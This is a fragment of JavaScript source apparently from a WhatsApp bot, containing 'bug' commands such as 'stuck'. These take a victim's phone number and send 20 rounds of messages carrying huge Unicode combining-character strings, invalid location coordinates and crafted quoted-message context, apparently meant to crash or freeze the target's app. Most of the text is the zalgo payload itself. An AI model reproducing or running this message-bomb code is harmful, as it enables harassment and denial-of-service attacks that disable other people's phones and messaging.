̢̧̱̤͇̥̼͖͔͍̮̩̝̜̮̭̻͕ᆞ̷̡̡̧̨̢̢̡̧̡̧̨̧̡̨̢̨̨̢̧̢̛̛̛͈̘̺̰̪̤͖͓̱̹͕͇̱̜͇̲̩̭͙͖͚̠̦̖̖̤̟̜͙̦̦̫̪̯̖͚͔̞̦̳̬̻̗̻̦̲̩̦̻̗̭̲̭͈̟̦͇͉͉͇̺̰̳͖̮̼̙̟̹͍̙̯̯͉̳͍͇̼͙͉̠̳̜̼͉̗̪̞͓̩͔̩̭͇̮̱͇͉͕̳̠͚͎̻͚͉͇̯̬͔̮̲̩̰͔͕̦̗̺͔̝̟̬̖̞͍͍͓̣̩̼̱̣̱̫̫̤̮̪͚̦̰̳̞̤̻̲̥͓͈̜͖͇̲̞̼̫̯͇̭͉̤̲͎̠̣̈́͛̎̑̍͆͋́̀͆̀̈̐͂͗̉͐̿̉̊̈̔̿̊͌̍͗̀̆̈́̓̐̉̓̈́͂̏̊͋̒̌̾̋̂̏̍̄̋̅̓̇̂̓̆̌͐͌̒͑́͋̒͆̽̂͊̒̃͐̈͛̇̀͆̐̂͑̓̾͆̍̋͐̓͗̽̔͊̒́̎̈́̽̒̈̓͊̂̄͋͛̾̔́̀̌͛͒͒͑̅̚͘̕͘̚̚͘͜͜͜͜͜͜͠͝͝͝͠ͅͅͅͅᆞ̸̨̢̢̢̡̛̛̛̛̛͓̻̬͙̦̙̭̪̞͕̳͙̜̜̰̫͕͈̲̙͖̯̝͚̻̭̪̮̳̙̝̙̣̻͍͙͕̾͗̍̈̄̽̀̑̉̆̿̈́̇̓̿͋̍̄̽͗̈͌̃̓͌̇̈́̀̾̾̿͛̋͐̆͑́͐̏̐̑̀̈́́̌̐̃̄̀͆̋́̈́̄͌̓́̑̇̃̽̉̔̾́̅̌̆̐̽͂̂͒̒̌̊̄͂̓͒̍̊̎̾̈́͆̒̓͐̀̏̍̿͒̇́̓̾͌͆͌͌̽́̔͊̎̿̀͆̂̐̐̋̅͗̆̓̉̔͒̈́́͌͊̾̀̿͆͐̂͑́̀̒̂̀̽͂͒̉̒̍̍͌̿̀́́̈̂̓͗͒̏̔͛̃͊̔͒͗̏̓̅́̅͋̾̿̈̇̇̋͒͐̈́̔̈́̒̈̄̏̑̾̍̑̃̈̿̓̀͒̃͌̽̾̔̒̂̈́̎̚̚̕̕̚̚͘͘̕͘̚̚̕̕͘͘͜͝͝͝͝͝͝͠͝͝͝͝͠͝͝͝͝ͅͅỚ̸̡̢̨̡̨̧̧̢̡̢̢̡̢̡̡̢̡̧̢̢̧̧̛̛̛̛͙̜̲̻͕̙̝̖̲̖̦͉̫̺͕̟̲͕̲̹̮̰̥̗̰̝̯̞̩̥͇͍͍̖̣͈̗̝̪͚͔͇̼̺͓͉̗̤̞̰͇̤͈̠͙͙͈̠̼͈̮͓͉̺̩̤͔̩̩̰͙̟̠̠̟̣̭͙̘̰̖͚̹̬̘̳̤̟̯͎͖̠͎̳̝̫̗̳̮̫̭̲̦͍̫͕͇̖̝̯̞͙̝̜̲̘̺͓̪̗̯̟̓̓̾̾̏̽̆̍̈̋̄̂̉̾͒̍̔̈̎͊̓͛̊͒̀̃͑͒̋̀̈́̂̋̏̐̇̈́̓̎̀̓̿̏͒̓͊̀̏̄͌͐͌̏͌̽̽̽̄̀̿̇͋̏̀͐̓̊͋̐̀̄̍̏͐̄̈́̎̃̀͌̎̊́̆̈́̅́͊̇̒͊̋̓͗̈́̒͛͌̔̉͛̐̆̑͌͛̓͗̇͑͐̈́̈́̑͛̌̽̉̀̏̎̚͘͘͘͘͜͜͝͠͝͠͝͠͝ͅͅͅͅᆞ̶̨̧̨̡̡̡̡̢̨̡̢̨̢̢̧̨̨̨̧̛̛̛̛̛̭͇̯̼̘̲̣̯͍̫̭͎̯͙̼͔̰͍̖̯̰̙̭͎̥͖̳̞̞̘̬̗̩̬̬͕̥̬̻̯̲̺̗̳̮̻̞̫͙̣̘̹̳͎̰̲͈̹̱̪͇̬̪̤͙̠̖͔̭͓̤͎̤̠̳̱̗̣͔̣͙̞͚͕̞̗̦̳͚̟̝̜̤̣͇̙͍̣̳̻̭̬̳͎̝̭̳̝͍̳̺̏̂̋͆̉̋͛͐̀̓̓̊͗̐͒̄̀̏̌͗͐̓̿̒͑̐̉̆̀̀͑͒̌͛͋̋̓̾́̽̎̉͐̄̐͑̈́͒̔̾́͑̍̈́̅̅̇͗̉̓͐̿̈́̃̔̏͑̾̚͘̚̚͜͜͝͝͠ͅᆞ̴̡̧̡̫͎̰̝̞̹̼̫̮̯̲̟̟͕̳̭̙̲̪̥̥̼̩̦̯̹̳̭̯͎̗̤͕̼̫͓̺̮̈̄͛̌͠Ş̸̢̡̨̡̢̡̡̢̡̡̧̨̡̨̧̢̡̧̨̝̰͉͓͖̳̺̠͇̮̩̬͍͇͚̜̗̮̣̤͉͎̹̺̭͙͓͔̰̥͚̠̪̩̗̳̭̙̟̯̙̳̘̖̬̟̘̜̭͍͇͚̹͚͇̺̠͖̫͕͉͉͎͖̣̯̭̼̘̗̰̤̯͖̼̯̱̖̟̲̻̭̩̜̗̥͔̹͕͓̙͈͎͎̮̗̣̩̠̜̪͍̱̯͉̺̥̮̯̭͎̟̥̯̼̹̜̥̫̬͖̲̘̝̖̲̱͉̟̝͚̘̪̙͉̭͙̠̙̦͚̰̩̬͉̹̝̭̥̲͚̖͔̣̫͈̥͍̘͖̰̦̖̺̜̭̦̞̼̠̣̮̭̻͔͕̯̭̝̼̞͎͈͖̤͉̮̬̺̦͙̩̭͓͎̩̩̣̱̰̫̖̞̣͈̦͔͖̑͑͗̈́̉̿͌̒̉͛̊̆̈̽̀̅̊̈͑̈́̿̓̋̀͑̓̀̈̾̀̔̋̊̑̐̃̐̆̈̓͐͑̾̐̇̈̃̑͆̚͘͜͜͜͜͠͝͝ͅͅͅͅͅᆞ̸̧̨̢̢̨̢̡̢̨̧̡̡̡̨̡̧̢̡̨̡̡̡̧̡̢̢̡̛̲̣̝̞̝͖̹̟̣̱͖͇̼̮̜̥̼͙̬͙̼͔͓̰̦͇͈̘͈̘̺̲̤̺̱̮͖̳͚͙͈͔̮͍̹̮̰͚̪̦̼̥͈̠͓̠͖͚͉̱̮͖̪̹̬̻̙͉͈͖̹̹̳͇̠̮͙̹̥̯̥̦̲̘̗̳͚̯̠͖͖͓̥͎͔̤̠͔̣̯͉̯̮̰̹͖̻͎̜̹̖̲̱̜̰̥̟͇̪̥͚̻̯̝͍̞͇̭̩̯͎͙͖̝̱̱̪̻̙̤̮͇͕͍̯̠͕̯̪̫̦̭̦̼̜̠͍͕̖͕̭͕͔̩̼̱͎̯̝͎̻̱̪̗̟̜̬̙͇̫̹̘̮̪͕̯͎͇̤́͊̈̊̽̎̇̓͌̈̄͊͑͆̈́̀̅̈́̑̐̽̎̎͒̔̒͂͂͋̊̈͑̀̾̈́̇͑̈̓́͛̿̍͑̑̄̈́̂̆̏̈́̂͋́́̾̏͛̒̔̏̈́̊͐͘̚͘̚̚̚̕͠͠͝͝͠͠ͅͅͅͅͅͅͅͅ.com`,
      commet: xiphone,      
      jpegThumbnail: null
    }
  }, { quoted: xbug })
  await xartva.relayMessage(victim, {
    extendedTextMessage: {
      text: xiphone,
      contextInfo: {
        stanzaId: victim,
        participants: victim,
        quotedMessage: {
          conversation: xtext        
        },
        disappearingMode: {
          initiator: "CHANGED_IN_CHAT",
          trigger: "CHAT_SETTING"
        }
      },
      inviteLinkGroupTypeV2: true
    }
  }, { messageId: null })
  await sleep(6000)
}
await xreply(`> Done! Sending BUG Use ${prefix + command}`)
}
break
//=================================================//
case "stuck":{
if (!text) return xreply(`${prefix + command} 62857xxxxxxx`)
await bugloading()
await xreply(`> Sending BUG Use ${prefix + command}`)
let victim = text.split("|")[0]+"@s.whatsapp.net"
let amount = 20
for (let i = 0; i < amount; i++){
  await xartva.sendMessage(victim, {
    location: {
      degreesLatitude: 999.999,
      degreesLongitude: -99.888,
      name: xtext,
      address: '̷̡̢̢̢̢̢̡̢̢̨̧̛͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑̕͘̚̚͘͜͜͜͠͠͠͠͝ͅ️̴̛̱̠͍̟̺̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̕̕̕̚͘̕͝͠͠͝͝͝OzzyRyuchiXnxnẍ̷̡̢̢̢̢̢̡̢̢̨̧̛͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑̕͘̚̚͘͜͜͜͠͠͠͠͝ͅ️̴̢̡̡̡̛̱̠͍̟̺̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̕̕̕̚͘̕͜͝͠͠͝͝͝ͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̡̢̧̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕͔͎̻̖̞̟̻̮͚͚̱̤͇̥̼͖͔͍̮̩̝̜̮̭̻͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅᆞ̷̡̡̧̨̢̢̡̧̡̧̨̧̡̨̢̨̨̢̧̢̛̛̛͈̘̺̰̪̤͖͓̱̹͕͇̱̜͇̲̩̭͙͖͚̠̦̖̖̤̟̜͙̦̦̫̪̯̖͚͔̞̦̳̬̻̗̻̦̲̩̦̻̗̭̲̭͈̟̦͇͉͉͇̺̰̳͖̮̼̙̟̹͍̙̯̯͉̳͍͇̼͙͉̠̳̜̼͉̗̪̞͓̩͔̩̭͇̮̱͇͉͕̳̠͚͎̻͚͉͇̯̬͔̮̲̩̰͔͕̦̗̺͔̝̟̬̖̞͍͍͓̣̩̼̱̣̱̫̫̤̮̪͚̦̰̳̞̤̻̲̥͓͈̜͖͇̲̞̼̫̯͇̭͉̤̲͎̠̣̈́͛̎̑̍͆͋́̀͆̀̈̐͂͗̉͐̿̉̊̈̔̿̊͌̍͗̀̆̈́̓̐̉̓̈́͂̏̊͋̒̌̾̋̂̏̍̄̋̅̓̇̂̓̆̌͐͌̒͑́͋̒͆̽̂͊̒̃͐̈͛̇̀͆̐̂͑̓̾͆̍̋͐̓͗̽̔͊̒́̎̈́̽̒̈̓͊̂̄͋͛̾̔́̀̌͛͒͒͑̅̚͘̕͘̚̚͘͜͜͜͜͜͜͠͝͝͝͠ͅͅͅͅᆞ̸̨̢̢̢̡̛̛̛̛̛͓̻̬͙̦̙̭̪̞͕̳͙̜̜̰̫͕͈̲̙͖̯̝͚̻̭̪̮̳̙̝̙̣̻͍͙͕̾͗̍̈̄̽̀̑̉̆̿̈́̇̓̿͋̍̄̽͗̈͌̃̓͌̇̈́̀̾̾̿͛̋͐̆͑́͐̏̐̑̀̈́́̌̐̃̄̀͆̋́̈́̄͌̓́̑̇̃̽̉̔̾́̅̌̆̐̽͂̂͒̒̌̊̄͂̓͒̍̊̎̾̈́͆̒̓͐̀̏̍̿͒̇́̓̾͌͆͌͌̽́̔͊̎̿̀͆̂̐̐̋̅͗̆̓̉̔͒̈́́͌͊̾̀̿͆͐̂͑́̀̒̂̀̽͂͒̉̒̍̍͌̿̀́́̈̂̓͗͒̏̔͛̃͊̔͒͗̏̓̅́̅͋̾̿̈̇̇̋͒͐̈́̔̈́̒̈̄̏̑̾̍̑̃̈̿̓̀͒̃͌̽̾̔̒̂̈́̎̚̚̕̕̚̚͘͘̕͘̚̚̕̕͘͘͜͝͝͝͝͝͝͠͝͝͝͝͠͝͝͝͝ͅͅỚ̸̡̢̨̡̨̧̧̢̡̢̢̡̢̡̡̢̡̧̢̢̧̧̛̛̛̛͙̜̲̻͕̙̝̖̲̖̦͉̫̺͕̟̲͕̲̹̮̰̥̗̰̝̯̞̩̥͇͍͍̖̣͈̗̝̪͚͔͇̼̺͓͉̗̤̞̰͇̤͈̠͙͙͈̠̼͈̮͓͉̺̩̤͔̩̩̰͙̟̠̠̟̣̭͙̘̰̖͚̹̬̘̳̤̟̯͎͖̠͎̳̝̫̗̳̮̫̭̲̦͍̫͕͇̖̝̯̞͙̝̜̲̘̺͓̪̗̯̟̓̓̾̾̏̽̆̍̈̋̄̂̉̾͒̍̔̈̎͊̓͛̊͒̀̃͑͒̋̀̈́̂̋̏̐̇̈́̓̎̀̓̿̏͒̓͊̀̏̄͌͐͌̏͌̽̽̽̄̀̿̇͋̏̀͐̓̊͋̐̀̄̍̏͐̄̈́̎̃̀͌̎̊́̆̈́̅́͊̇̒͊̋̓͗̈́̒͛͌̔̉͛̐̆̑͌͛̓͗̇͑͐̈́̈́̑͛̌̽̉̀̏̎̚͘͘͘͘͜͜͝͠͝͠͝͠͝ͅͅͅͅᆞ̶̨̧̨̡̡̡̡̢̨̡̢̨̢̢̧̨̨̨̧̛̛̛̛̛̭͇̯̼̘̲̣̯͍̫̭͎̯͙̼͔̰͍̖̯̰̙̭͎̥͖̳̞̞̘̬̗̩̬̬͕̥̬̻̯̲̺̗̳̮̻̞̫͙̣̘̹̳͎̰̲͈̹̱̪͇̬̪̤͙̠̖͔̭͓̤͎̤̠̳̱̗̣͔̣͙̞͚͕̞̗̦̳͚̟̝̜̤̣͇̙͍̣̳̻̭̬̳͎̝̭̳̝͍̳̺̏̂̋͆̉̋͛͐̀̓̓̊͗̐͒̄̀̏̌͗͐̓̿̒͑̐̉̆̀̀͑͒̌͛͋̋̓̾́̽̎̉͐̄̐͑̈́͒̔̾́͑̍̈́̅̅̇͗̉̓͐̿̈́̃̔̏͑̾̚͘̚̚͜͜͝͝͠ͅᆞ̴̡̧̡̫͎̰̝̞̹̼̫̮̯̲̟̟͕̳̭̙̲̪̥̥̼̩̦̯̹̳̭̯͎̗̤͕̼̫͓̺̮̈̄͛̌͠Ş̸̢̡̨̡̢̡̡̢̡̡̧̨̡̨̧̢̡̧̨̝̰͉͓͖̳̺̠͇̮̩̬͍͇͚̜̗̮̣̤͉͎̹̺̭͙͓͔̰̥͚̠̪̩̗̳̭̙̟̯̙̳̘̖̬̟̘̜̭͍͇͚̹͚͇̺̠͖̫͕͉͉͎͖̣̯̭̼̘̗̰̤̯͖̼̯̱̖̟̲̻̭̩̜̗̥͔̹͕͓̙͈͎͎̮̗̣̩̠̜̪͍̱̯͉̺̥̮̯̭͎̟̥̯̼̹̜̥̫̬͖̲̘̝̖̲̱͉̟̝͚̘̪̙͉̭͙̠̙̦͚̰̩̬͉̹̝̭̥̲͚̖͔̣̫͈̥͍̘͖̰̦̖̺̜̭̦̞̼̠̣̮̭̻͔͕̯̭̝̼̞͎͈͖̤͉̮̬̺̦͙̩̭͓͎̩̩̣̱̰̫̖̞̣͈̦͔͖̑͑͗̈́̉̿͌̒̉͛̊̆̈̽̀̅̊̈͑̈́̿̓̋̀͑̓̀̈̾̀̔̋̊̑̐̃̐̆̈̓͐͑̾̐̇̈̃̑͆̚͘͜͜͜͜͠͝͝ͅͅͅͅͅᆞ̸̷̧̨̢̢̨̢̡̢̨̧̡̡̡̨̡̧̢̡̨̡̡̡̧̡̢̢̡̡̢̢̢̢̢̡̢̢̨̧̛̛̲̣̝̞̝͖̹̟̣̱͖͇̼̮̜̥̼͙̬͙̼͔͓̰̦͇͈̘͈̘̺̲̤̺̱̮͖̳͚͙͈͔̮͍̹̮̰͚̪̦̼̥͈̠͓̠͖͚͉̱̮͖̪̹̬̻̙͉͈͖̹̹̳͇̠̮͙̹̥̯̥̦̲̘̗̳͚̯̠͖͖͓̥͎͔̤̠͔̣̯͉̯̮̰̹͖̻͎̜̹̖̲̱̜̰̥̟͇̪̥͚̻̯̝͍̞͇̭̩̯͎͙͖̝̱̱̪̻̙̤̮͇͕͍̯̠͕̯̪̫̦̭̦̼̜̠͍͕̖͕̭͕͔̩̼̱͎̯̝͎̻̱̪̗̟̜̬̙͇̫̹̘̮̪͕̯͎͇̤͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓́͊̈̊̽̎̇̓͌̈̄͊͑͆̈́̀̅̈́̑̐̽̎̎͒̔̒͂͂͋̊̈͑̀̾̈́̇͑̈̓́͛̿̍͑̑̄̈́̂̆̏̈́̂͋́́̾̏͛̒̔̏̈́̊͐̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑͘̚͘̚̚̚̕̕͘̚̚͘͜͜͜͠͠͝͝͠͠͠͠͠͠͝ͅͅͅͅͅͅͅͅͅ️̴̢̡̡̡̛̱̠͍̟̺̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̕̕̕̚͘̕͜͝͠͠͝͝͝ͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̡̢̧̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕͔͎̻̖̞̟̻̮͚͚̱̤͇̥̼͖͔͍̮̩̝̜̮̭̻͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅᆞ̷̡̡̧̨̢̢̡̧̡̧̨̧̡̨̢̨̨̢̧̢̛̛̛͈̘̺̰̪̤͖͓̱̹͕͇̱̜͇̲̩̭͙͖͚̠̦̖̖̤̟̜͙̦̦̫̪̯̖͚͔̞̦̳̬̻̗̻̦̲̩̦̻̗̭̲̭͈̟̦͇͉͉͇̺̰̳͖̮̼̙̟̹͍̙̯̯͉̳͍͇̼͙͉̠̳̜̼͉̗̪̞͓̩͔̩̭͇̮̱͇͉͕̳̠͚͎̻͚͉͇̯̬͔̮̲̩̰͔͕̦̗̺͔̝̟̬̖̞͍͍͓̣̩̼̱̣̱̫̫̤̮̪͚̦̰̳̞̤̻̲̥͓͈̜͖͇̲̞̼̫̯͇̭͉̤̲͎̠̣̈́͛̎̑̍͆͋́̀͆̀̈̐͂͗̉͐̿̉̊̈̔̿̊͌̍͗̀̆̈́̓̐̉̓̈́͂̏̊͋̒̌̾̋̂̏̍̄̋̅̓̇̂̓̆̌͐͌̒͑́͋̒͆̽̂͊̒̃͐̈͛̇̀͆̐̂͑̓̾͆̍̋͐̓͗̽̔͊̒́̎̈́̽̒̈̓͊̂̄͋͛̾̔́̀̌͛͒͒͑̅̚͘̕͘̚̚͘͜͜͜͜͜͜͠͝͝͝͠ͅͅͅͅᆞ̸̨̢̢̢̡̛̛̛̛̛͓̻̬͙̦̙̭̪̞͕̳͙̜̜̰̫͕͈̲̙͖̯̝͚̻̭̪̮̳̙̝̙̣̻͍͙͕̾͗̍̈̄̽̀̑̉̆̿̈́̇̓̿͋̍̄̽͗̈͌̃̓͌̇̈́̀̾̾̿͛̋͐̆͑́͐̏̐̑̀̈́́̌̐̃̄̀͆̋́̈́̄͌̓́̑̇̃̽̉̔̾́̅̌̆̐̽͂̂͒̒̌̊̄͂̓͒̍̊̎̾̈́͆̒̓͐̀̏̍̿͒̇́̓̾͌͆͌͌̽́̔͊̎̿̀͆̂̐̐̋̅͗̆̓̉̔͒̈́́͌͊̾̀̿͆͐̂͑́̀̒̂̀̽͂͒̉̒̍̍͌̿̀́́̈̂̓͗͒̏̔͛̃͊̔͒͗̏̓̅́̅͋̾̿̈̇̇̋͒͐̈́̔̈́̒̈̄̏̑̾̍̑̃̈̿̓̀͒̃͌̽̾̔̒̂̈́̎̚̚̕̕̚̚͘͘̕͘̚̚̕̕͘͘͜͝͝͝͝͝͝͠͝͝͝͝͠͝͝͝͝ͅͅỚ̸̡̢̨̡̨̧̧̢̡̢̢̡̢̡̡̢̡̧̢̢̧̧̛̛̛̛͙̜̲̻͕̙̝̖̲̖̦͉̫̺͕̟̲͕̲̹̮̰̥̗̰̝̯̞̩̥͇͍͍̖̣͈̗̝̪͚͔͇̼̺͓͉̗̤̞̰͇̤͈̠͙͙͈̠̼͈̮͓͉̺̩̤͔̩̩̰͙̟̠̠̟̣̭͙̘̰̖͚̹̬̘̳̤̟̯͎͖̠͎̳̝̫̗̳̮̫̭̲̦͍̫͕͇̖̝̯̞͙̝̜̲̘̺͓̪̗̯̟̓̓̾̾̏̽̆̍̈̋̄̂̉̾͒̍̔̈̎͊̓͛̊͒̀̃͑͒̋̀̈́̂̋̏̐̇̈́̓̎̀̓̿̏͒̓͊̀̏̄͌͐͌̏͌̽̽̽̄̀̿̇͋̏̀͐̓̊͋̐̀̄̍̏͐̄̈́̎̃̀͌̎̊́̆̈́̅́͊̇̒͊̋̓͗̈́̒͛͌̔̉͛̐̆̑͌͛̓͗̇͑͐̈́̈́̑͛̌̽̉̀̏̎̚͘͘͘͘͜͜͝͠͝͠͝͠͝ͅͅͅͅᆞ̶̨̧̨̡̡̡̡̢̨̡̢̨̢̢̧̨̨̨̧̛̛̛̛̛̭͇̯̼̘̲̣̯͍̫̭͎̯͙̼͔̰͍̖̯̰̙̭͎̥͖̳̞̞̘̬̗̩̬̬͕̥̬̻̯̲̺̗̳̮̻̞̫͙̣̘̹̳͎̰̲͈̹̱̪͇̬̪̤͙̠̖͔̭͓̤͎̤̠̳̱̗̣͔̣͙̞͚͕̞̗̦̳͚̟̝̜̤̣͇̙͍̣̳̻̭̬̳͎̝̭̳̝͍̳̺̏̂̋͆̉̋͛͐̀̓̓̊͗̐͒̄̀̏̌͗͐̓̿̒͑̐̉̆̀̀͑͒̌͛͋̋̓̾́̽̎̉͐̄̐͑̈́͒̔̾́͑̍̈́̅̅̇͗̉̓͐̿̈́̃̔̏͑̾̚͘̚̚͜͜͝͝͠ͅᆞ̴̡̧̡̫͎̰̝̞̹̼̫̮̯̲̟̟͕̳̭̙̲̪̥̥̼̩̦̯̹̳̭̯͎̗̤͕̼̫͓̺̮̈̄͛̌͠Ş̸̢̡̨̡̢̡̡̢̡̡̧̨̡̨̧̢̡̧̨̝̰͉͓͖̳̺̠͇̮̩̬͍͇͚̜̗̮̣̤͉͎̹̺̭͙͓͔̰̥͚̠̪̩̗̳̭̙̟̯̙̳̘̖̬̟̘̜̭͍͇͚̹͚͇̺̠͖̫͕͉͉͎͖̣̯̭̼̘̗̰̤̯͖̼̯̱̖̟̲̻̭̩̜̗̥͔̹͕͓̙͈͎͎̮̗̣̩̠̜̪͍̱̯͉̺̥̮̯̭͎̟̥̯̼̹̜̥̫̬͖̲̘̝̖̲̱͉̟̝͚̘̪̙͉̭͙̠̙̦͚̰̩̬͉̹̝̭̥̲͚̖͔̣̫͈̥͍̘͖̰̦̖̺̜̭̦̞̼̠̣̮̭̻͔͕̯̭̝̼̞͎͈͖̤͉̮̬̺̦͙̩̭͓͎̩̩̣̱̰̫̖̞̣͈̦͔͖̑͑͗̈́̉̿͌̒̉͛̊̆̈̽̀̅̊̈͑̈́̿̓̋̀͑̓̀̈̾̀̔̋̊̑̐̃̐̆̈̓͐͑̾̐̇̈̃̑͆̚͘͜͜͜͜͠͝͝ͅͅͅͅͅ